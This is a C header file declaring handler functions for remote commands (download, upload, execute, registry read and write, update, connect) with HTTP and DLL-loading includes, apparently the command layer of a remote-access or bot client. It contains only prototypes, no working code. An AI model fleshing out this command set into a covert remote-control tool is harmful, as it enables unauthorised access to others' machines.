#if !defined(FUNCTION_H__36DB8046_25CF_412B_8619_391C20E99D42__INCLUDED_)
#define FUNCTION_H__36DB8046_25CF_412B_8619_391C20E99D42__INCLUDED_

#include "ComManager.h"
#include "../../shared/include/loadDll.h"
#include "../../shared/include/CHTTPClass.h"


#include <windows.h> // 2 DELETE

void setWindows(HWND win); // 2DELETE
int COMMAND_download(API *pAPI,COMMAND *pCom);
int COMMAND_upload(API *pAPI,COMMAND *pCom);
int COMMAND_execute(API *pAPI, COMMAND *pCom);
int COMMAND_MessageBox(API *pAPI, COMMAND *pCom);
int COMMAND_Update(API *pAPI, COMMAND *pCom);
int COMMAND_getInfo(API *pAPI, COMMAND *pCom);
int COMMAND_SetRegKey(API *pAPI, COMMAND *pCom);
int COMMAND_GetRegKey(API *pAPI, COMMAND *pCom) ; 
int COMMAND_TTS(API *pAPI, COMMAND *pCom);
int COMMAND_CONNECT(API *pAPI, COMMAND *pCom);
#endif

